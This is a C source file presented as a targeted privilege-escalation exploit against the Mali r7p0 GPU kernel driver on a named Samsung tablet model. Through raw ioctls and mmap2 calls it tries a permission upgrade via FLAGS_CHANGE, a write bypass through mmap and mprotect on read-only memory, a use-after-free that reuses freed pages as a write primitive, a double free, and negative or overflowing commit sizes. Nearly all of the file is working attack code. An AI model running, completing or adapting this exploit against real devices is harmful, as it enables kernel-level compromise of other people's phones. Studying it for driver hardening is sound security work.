/*
 * mali_exploit.c — Mali r7p0 targeted privilege escalation
 *
 * Corrected struct layout based on probe results:
 * - MEM_ALLOC at size=56 returns gpu_va at offset 40 (u32/u64)
 * - header.ret is NOT used by driver; check ioctl return value
 * - Driver ignores _IOC_TYPE and _IOC_NR; only _IOC_SIZE + uk_header.id
 *
 * Attack vectors:
 * 1. FLAGS_CHANGE: upgrade CPU_RD → CPU_RD|CPU_WR after allocation
 * 2. mmap bypass: request PROT_WRITE on read-only GPU region
 * 3. UAF: mmap → free → access (dangling mapping)
 * 4. Double free / refcount manipulation
 */

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/ioctl.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

/* mmap2 takes offset in PAGE_SIZE units — handles 64-bit GPU VA on 32-bit */
static void *mmap2(void *addr, size_t length, int prot, int flags,
                   int fd, unsigned long pgoff) {
    return (void*)syscall(__NR_mmap2, addr, length, prot, flags, fd, pgoff);
}

#define DEV_PATH "/dev/mali0"
#define PAGE_SIZE 4096

/* UK interface */
struct uk_header {
    uint32_t id;
    uint32_t ret;
};

#define UKP_FUNC_ID_CHECK_VERSION 0
#define KBASE_FUNC_SET_FLAGS      530
#define KBASE_FUNC_MEM_ALLOC      512
#define KBASE_FUNC_MEM_FREE       516
#define KBASE_FUNC_MEM_FLAGS_CHANGE 517
#define KBASE_FUNC_MEM_COMMIT     514
#define KBASE_FUNC_STREAM_CREATE  536

/* Memory flags */
#define BASE_MEM_PROT_CPU_RD    (1U << 0)
#define BASE_MEM_PROT_CPU_WR    (1U << 1)
#define BASE_MEM_PROT_GPU_RD    (1U << 2)
#define BASE_MEM_PROT_GPU_WR    (1U << 3)
#define BASE_MEM_PROT_GPU_EX    (1U << 4)
#define BASE_MEM_GROW_ON_GPF    (1U << 9)
#define BASE_MEM_COHERENT_LOCAL (1U << 11)
#define BASE_MEM_CACHED_CPU     (1U << 12)
#define BASE_MEM_SAME_VA        (1U << 17)
#define BASE_MEM_NEED_MMAP      (1U << 18)

static unsigned int make_cmd(uint32_t size) {
    return _IOC(_IOC_READ | _IOC_WRITE, 'M', 0, size);
}

static void hexdump(const char *label, const void *data, size_t len) {
    const uint8_t *p = data;
    fprintf(stderr, "%s (%zu bytes):\n", label, len);
    for (size_t i = 0; i < len; i += 16) {
        fprintf(stderr, "  %04zx: ", i);
        for (size_t j = 0; j < 16 && i+j < len; j++)
            fprintf(stderr, "%02x ", p[i+j]);
        fprintf(stderr, "\n");
    }
}

static int mali_fd;

static int do_handshake(void) {
    uint8_t buf[16];
    memset(buf, 0, sizeof(buf));
    ((struct uk_header*)buf)->id = UKP_FUNC_ID_CHECK_VERSION;
    buf[8] = 10; buf[9] = 0;
    if (ioctl(mali_fd, make_cmd(16), buf) < 0) return -1;

    memset(buf, 0, sizeof(buf));
    ((struct uk_header*)buf)->id = KBASE_FUNC_SET_FLAGS;
    if (ioctl(mali_fd, make_cmd(16), buf) < 0) return -1;

    fprintf(stderr, "[+] Handshake OK (UK v10.0)\n");
    return 0;
}

/* Allocate GPU memory — returns gpu_va (0 on failure) */
static uint64_t gpu_alloc(uint32_t pages, uint32_t flags) {
    uint8_t buf[56];
    memset(buf, 0, sizeof(buf));
    ((struct uk_header*)buf)->id = KBASE_FUNC_MEM_ALLOC;
    *(uint64_t*)(buf + 8)  = pages;    /* va_pages */
    *(uint64_t*)(buf + 16) = pages;    /* commit_pages */
    *(uint64_t*)(buf + 24) = 0;        /* extent */
    *(uint32_t*)(buf + 32) = flags;    /* flags */

    if (ioctl(mali_fd, make_cmd(56), buf) < 0) {
        fprintf(stderr, "[-] MEM_ALLOC ioctl: %s\n", strerror(errno));
        return 0;
    }

    /* gpu_va at offset 40 */
    uint64_t gpu_va = *(uint64_t*)(buf + 40);
    /* Also check if it's just a u32 */
    uint32_t gpu_va32 = *(uint32_t*)(buf + 40);

    if (gpu_va == 0 && gpu_va32 == 0) {
        fprintf(stderr, "[-] MEM_ALLOC returned gpu_va=0\n");
        return 0;
    }

    return gpu_va ? gpu_va : gpu_va32;
}

static int gpu_free(uint64_t gpu_va) {
    uint8_t buf[24];
    memset(buf, 0, sizeof(buf));
    ((struct uk_header*)buf)->id = KBASE_FUNC_MEM_FREE;
    *(uint64_t*)(buf + 8) = gpu_va;
    int r = ioctl(mali_fd, make_cmd(24), buf);
    if (r < 0) {
        /* Try size 16 */
        memset(buf, 0, 16);
        ((struct uk_header*)buf)->id = KBASE_FUNC_MEM_FREE;
        *(uint64_t*)(buf + 8) = gpu_va;
        r = ioctl(mali_fd, make_cmd(16), buf);
    }
    return r;
}

static int gpu_flags_change(uint64_t gpu_va, uint32_t flags, uint32_t mask) {
    uint8_t buf[32];
    memset(buf, 0, sizeof(buf));
    ((struct uk_header*)buf)->id = KBASE_FUNC_MEM_FLAGS_CHANGE;
    *(uint64_t*)(buf + 8)  = gpu_va;
    *(uint32_t*)(buf + 16) = flags;
    *(uint32_t*)(buf + 20) = mask;

    int r = ioctl(mali_fd, make_cmd(32), buf);
    return r;
}

/* Try mmap at a GPU VA using mmap2 (handles 64-bit offset on 32-bit) */
static void *gpu_mmap(uint64_t gpu_va, size_t len, int prot) {
    void *p;
    unsigned long pgoff;

    /* Mali mmap: offset = gpu_va in bytes, kernel gets vma->vm_pgoff = offset/PAGE_SIZE */
    /* mmap2 takes pgoff directly (offset in pages) */

    /* Try: pgoff = gpu_va / PAGE_SIZE (gpu_va is page-aligned) */
    pgoff = (unsigned long)(gpu_va >> 12);
    p = mmap2(NULL, len, prot, MAP_SHARED, mali_fd, pgoff);
    if (p != MAP_FAILED) return p;
    int e1 = errno;

    /* Try: pgoff = gpu_va directly (some drivers use bytes) */
    pgoff = (unsigned long)(gpu_va & 0xFFFFFFFF);
    if (pgoff != (unsigned long)(gpu_va >> 12)) {
        p = mmap2(NULL, len, prot, MAP_SHARED, mali_fd, pgoff);
        if (p != MAP_FAILED) return p;
    }

    /* Try: pgoff = lower 32 bits of gpu_va >> 12 */
    pgoff = (unsigned long)((gpu_va >> 12) & 0xFFFFF);
    p = mmap2(NULL, len, prot, MAP_SHARED, mali_fd, pgoff);
    if (p != MAP_FAILED) return p;

    fprintf(stderr, "    mmap2 attempts failed (e1=%d: %s)\n", e1, strerror(e1));
    return MAP_FAILED;
}

/* ============================================================ */
/* TEST 1: Basic alloc → mmap → read/write                      */
/* ============================================================ */
static void test_basic_rw(void) {
    fprintf(stderr, "\n=== TEST 1: Basic alloc → mmap → read/write ===\n");

    uint32_t flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                     BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR;
    uint64_t va = gpu_alloc(1, flags);
    if (!va) return;
    fprintf(stderr, "[+] Allocated 1 page RW @ gpu_va=0x%08llx\n",
            (unsigned long long)va);

    void *p = gpu_mmap(va, PAGE_SIZE, PROT_READ | PROT_WRITE);
    if (p == MAP_FAILED) {
        fprintf(stderr, "[-] mmap failed: %s\n", strerror(errno));
        fprintf(stderr, "[*] Trying SAME_VA allocation...\n");
        gpu_free(va);

        /* Retry with SAME_VA */
        flags |= BASE_MEM_SAME_VA;
        va = gpu_alloc(1, flags);
        if (!va) return;
        fprintf(stderr, "[+] SAME_VA alloc @ gpu_va=0x%08llx\n",
                (unsigned long long)va);
        p = gpu_mmap(va, PAGE_SIZE, PROT_READ | PROT_WRITE);
        if (p == MAP_FAILED) {
            fprintf(stderr, "[-] SAME_VA mmap also failed: %s\n", strerror(errno));
            gpu_free(va);
            return;
        }
    }

    fprintf(stderr, "[+] mmap'd @ %p\n", p);
    *(volatile uint32_t*)p = 0xDEADBEEF;
    fprintf(stderr, "[+] Write/read: 0x%08x\n", *(volatile uint32_t*)p);

    munmap(p, PAGE_SIZE);
    gpu_free(va);
    fprintf(stderr, "[+] Basic RW test PASSED\n");
}

/* ============================================================ */
/* TEST 2: FLAGS_CHANGE — RD-only → RW upgrade                  */
/* ============================================================ */
static void test_flags_upgrade(void) {
    fprintf(stderr, "\n=== TEST 2: FLAGS_CHANGE permission upgrade ===\n");

    /* Allocate CPU read-only */
    uint32_t flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD |
                     BASE_MEM_PROT_GPU_WR;
    uint64_t va = gpu_alloc(1, flags);
    if (!va) return;
    fprintf(stderr, "[+] Allocated CPU_RD-only @ 0x%08llx\n",
            (unsigned long long)va);

    /* Try FLAGS_CHANGE to add CPU_WR */
    int r = gpu_flags_change(va, BASE_MEM_PROT_CPU_WR, BASE_MEM_PROT_CPU_WR);
    if (r >= 0) {
        fprintf(stderr, "[!] FLAGS_CHANGE(+CPU_WR) ioctl succeeded (ret=%d)!\n", r);

        /* Try to mmap with write */
        void *p = gpu_mmap(va, PAGE_SIZE, PROT_READ | PROT_WRITE);
        if (p != MAP_FAILED) {
            fprintf(stderr, "[!!!] WRITABLE MMAP ON UPGRADED REGION @ %p!\n", p);
            *(volatile uint32_t*)p = 0xCAFEBABE;
            fprintf(stderr, "[!!!] WRITE SUCCEEDED: 0x%08x — EXPLOITABLE!\n",
                    *(volatile uint32_t*)p);
            munmap(p, PAGE_SIZE);
        } else {
            fprintf(stderr, "[*] mmap WRITE on upgraded region failed: %s\n",
                    strerror(errno));
        }
    } else {
        fprintf(stderr, "[*] FLAGS_CHANGE denied: %s\n", strerror(errno));
    }

    /* Also try various flag combinations */
    struct { uint32_t f; uint32_t m; const char *d; } tests[] = {
        { BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_CPU_RD,
          BASE_MEM_PROT_CPU_WR, "+CPU_WR (with RD)" },
        { 0xFFFFFFFF, 0xFFFFFFFF, "ALL FLAGS" },
        { BASE_MEM_PROT_GPU_EX, BASE_MEM_PROT_GPU_EX, "+GPU_EX" },
        { BASE_MEM_GROW_ON_GPF, BASE_MEM_GROW_ON_GPF, "+GROW_ON_GPF" },
    };
    for (int i = 0; i < 4; i++) {
        r = gpu_flags_change(va, tests[i].f, tests[i].m);
        fprintf(stderr, "[*] FLAGS_CHANGE %s: ioctl=%d\n", tests[i].d, r);
    }

    gpu_free(va);
}

/* ============================================================ */
/* TEST 3: mmap PROT_WRITE on CPU_RD-only allocation             */
/* ============================================================ */
static void test_mmap_bypass(void) {
    fprintf(stderr, "\n=== TEST 3: mmap PROT_WRITE bypass ===\n");

    uint32_t flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD;
    uint64_t va = gpu_alloc(1, flags);
    if (!va) return;
    fprintf(stderr, "[+] Allocated CPU_RD-only @ 0x%08llx\n",
            (unsigned long long)va);

    /* Try mmap with PROT_WRITE */
    void *p = gpu_mmap(va, PAGE_SIZE, PROT_READ | PROT_WRITE);
    if (p != MAP_FAILED) {
        fprintf(stderr, "[!!!] WRITE MMAP ON RD-ONLY SUCCEEDED @ %p!\n", p);
        *(volatile uint32_t*)p = 0x41414141;
        fprintf(stderr, "[!!!] WROTE 0x%08x — mmap bypass CONFIRMED!\n",
                *(volatile uint32_t*)p);
        munmap(p, PAGE_SIZE);
    } else {
        fprintf(stderr, "[*] mmap WRITE denied: %s (properly validated)\n",
                strerror(errno));
    }

    /* Try mmap with just PROT_READ, then mprotect to WRITE */
    void *q = gpu_mmap(va, PAGE_SIZE, PROT_READ);
    if (q != MAP_FAILED) {
        fprintf(stderr, "[+] RD-only mmap @ %p\n", q);
        int mr = mprotect(q, PAGE_SIZE, PROT_READ | PROT_WRITE);
        if (mr == 0) {
            fprintf(stderr, "[!!!] mprotect(+WRITE) SUCCEEDED!\n");
            *(volatile uint32_t*)q = 0x42424242;
            fprintf(stderr, "[!!!] WROTE 0x%08x via mprotect bypass!\n",
                    *(volatile uint32_t*)q);
        } else {
            fprintf(stderr, "[*] mprotect denied: %s\n", strerror(errno));
        }
        munmap(q, PAGE_SIZE);
    }

    gpu_free(va);
}

/* ============================================================ */
/* TEST 4: UAF — mmap → free → access dangling mapping          */
/* ============================================================ */
static void test_uaf(void) {
    fprintf(stderr, "\n=== TEST 4: UAF via dangling mmap ===\n");

    uint32_t flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                     BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR;
    uint64_t va = gpu_alloc(4, flags);
    if (!va) return;
    fprintf(stderr, "[+] Allocated 4 pages RW @ 0x%08llx\n",
            (unsigned long long)va);

    void *p = gpu_mmap(va, PAGE_SIZE * 4, PROT_READ | PROT_WRITE);
    if (p == MAP_FAILED) {
        flags |= BASE_MEM_SAME_VA;
        gpu_free(va);
        va = gpu_alloc(4, flags);
        if (!va) return;
        p = gpu_mmap(va, PAGE_SIZE * 4, PROT_READ | PROT_WRITE);
        if (p == MAP_FAILED) {
            fprintf(stderr, "[-] mmap failed\n");
            gpu_free(va);
            return;
        }
    }

    fprintf(stderr, "[+] mmap'd @ %p\n", p);

    /* Write pattern before free */
    for (int i = 0; i < 4; i++)
        ((volatile uint32_t*)p)[i * 1024] = 0xAA000000 + i;
    fprintf(stderr, "[+] Wrote patterns to all 4 pages\n");

    /* FREE the GPU memory while keeping the mmap */
    int r = gpu_free(va);
    fprintf(stderr, "[*] GPU free: ret=%d\n", r);

    if (r >= 0) {
        /* Try to access the dangling mapping */
        fprintf(stderr, "[*] Accessing freed memory...\n");

        volatile uint32_t val = ((volatile uint32_t*)p)[0];
        fprintf(stderr, "[*] Read after free: 0x%08x\n", val);

        /* Write to freed memory */
        ((volatile uint32_t*)p)[0] = 0xDEADDEAD;
        val = ((volatile uint32_t*)p)[0];
        fprintf(stderr, "[*] Write after free: 0x%08x\n", val);

        if (val == 0xDEADDEAD) {
            fprintf(stderr, "[!] WRITE-AFTER-FREE WORKS!\n");

            /* Allocate new memory — might reuse the freed pages */
            uint64_t va2 = gpu_alloc(4, flags);
            fprintf(stderr, "[*] New alloc @ 0x%08llx\n",
                    (unsigned long long)va2);

            if (va2) {
                void *p2 = gpu_mmap(va2, PAGE_SIZE * 4,
                                    PROT_READ | PROT_WRITE);
                if (p2 != MAP_FAILED) {
                    fprintf(stderr, "[*] New mmap @ %p\n", p2);

                    /* Write via old mapping */
                    ((volatile uint32_t*)p)[0] = 0xBEEF0001;
                    /* Read via new mapping */
                    volatile uint32_t v2 = ((volatile uint32_t*)p2)[0];
                    fprintf(stderr, "[*] Cross-mapping: old wrote 0xBEEF0001, new reads 0x%08x\n", v2);

                    if (v2 == 0xBEEF0001) {
                        fprintf(stderr, "[!!!] PAGE REUSE CONFIRMED — old mapping writes to new allocation!\n");
                        fprintf(stderr, "[!!!] This is a FULL UAF with write primitive!\n");
                    }

                    munmap(p2, PAGE_SIZE * 4);
                }
                gpu_free(va2);
            }
        }
    }

    munmap(p, PAGE_SIZE * 4);
}

/* ============================================================ */
/* TEST 5: Double free                                           */
/* ============================================================ */
static void test_double_free(void) {
    fprintf(stderr, "\n=== TEST 5: Double free ===\n");

    uint32_t flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                     BASE_MEM_PROT_GPU_RD;
    uint64_t va = gpu_alloc(1, flags);
    if (!va) return;
    fprintf(stderr, "[+] Alloc @ 0x%08llx\n", (unsigned long long)va);

    int r1 = gpu_free(va);
    fprintf(stderr, "[*] Free 1: ret=%d\n", r1);

    int r2 = gpu_free(va);
    fprintf(stderr, "[*] Free 2: ret=%d\n", r2);

    if (r2 >= 0) {
        fprintf(stderr, "[!] DOUBLE FREE ACCEPTED!\n");
    }
}

/* ============================================================ */
/* TEST 6: COMMIT manipulation — grow/shrink committed pages     */
/* ============================================================ */
static void test_commit(void) {
    fprintf(stderr, "\n=== TEST 6: MEM_COMMIT manipulation ===\n");

    /* Allocate with GROW_ON_GPF, small commit, large VA */
    uint32_t flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                     BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                     BASE_MEM_GROW_ON_GPF;

    uint8_t alloc_buf[56];
    memset(alloc_buf, 0, sizeof(alloc_buf));
    ((struct uk_header*)alloc_buf)->id = KBASE_FUNC_MEM_ALLOC;
    *(uint64_t*)(alloc_buf + 8)  = 16;  /* va_pages = 16 (64KB) */
    *(uint64_t*)(alloc_buf + 16) = 1;   /* commit_pages = 1 (4KB) */
    *(uint64_t*)(alloc_buf + 24) = 15;  /* extent = 15 (grow up to 16) */
    *(uint32_t*)(alloc_buf + 32) = flags;

    int r = ioctl(mali_fd, make_cmd(56), alloc_buf);
    uint64_t va = *(uint64_t*)(alloc_buf + 40);
    fprintf(stderr, "[*] GROW_ON_GPF alloc: ioctl=%d, gpu_va=0x%08llx\n",
            r, (unsigned long long)va);

    if (r >= 0 && va) {
        /* Try to commit more pages */
        uint8_t commit_buf[32];
        memset(commit_buf, 0, sizeof(commit_buf));
        ((struct uk_header*)commit_buf)->id = KBASE_FUNC_MEM_COMMIT;
        *(uint64_t*)(commit_buf + 8) = va;
        *(uint64_t*)(commit_buf + 16) = 16; /* commit all 16 pages */

        r = ioctl(mali_fd, make_cmd(32), commit_buf);
        fprintf(stderr, "[*] MEM_COMMIT(16): ioctl=%d\n", r);

        /* Try negative commit (shrink below 0) */
        memset(commit_buf, 0, sizeof(commit_buf));
        ((struct uk_header*)commit_buf)->id = KBASE_FUNC_MEM_COMMIT;
        *(uint64_t*)(commit_buf + 8) = va;
        *(int64_t*)(commit_buf + 16) = -1; /* negative pages! */

        r = ioctl(mali_fd, make_cmd(32), commit_buf);
        fprintf(stderr, "[*] MEM_COMMIT(-1): ioctl=%d\n", r);

        /* Try huge commit (integer overflow) */
        memset(commit_buf, 0, sizeof(commit_buf));
        ((struct uk_header*)commit_buf)->id = KBASE_FUNC_MEM_COMMIT;
        *(uint64_t*)(commit_buf + 8) = va;
        *(uint64_t*)(commit_buf + 16) = 0xFFFFFFFFFFFFFFFFULL;

        r = ioctl(mali_fd, make_cmd(32), commit_buf);
        fprintf(stderr, "[*] MEM_COMMIT(0xFFFF...): ioctl=%d\n", r);

        gpu_free(va);
    }
}

int main(void) {
    fprintf(stderr, "=== Mali r7p0 Targeted Exploit ===\n");
    fprintf(stderr, "Target: SM-T377A, r7p0-03rel0\n\n");

    mali_fd = open(DEV_PATH, O_RDWR | O_CLOEXEC);
    if (mali_fd < 0) {
        fprintf(stderr, "[-] open: %s\n", strerror(errno));
        return 1;
    }

    if (do_handshake() != 0) {
        close(mali_fd);
        return 1;
    }

    test_basic_rw();
    test_flags_upgrade();
    test_mmap_bypass();
    test_uaf();
    test_double_free();
    test_commit();

    fprintf(stderr, "\n=== All tests complete ===\n");
    close(mali_fd);
    return 0;
}
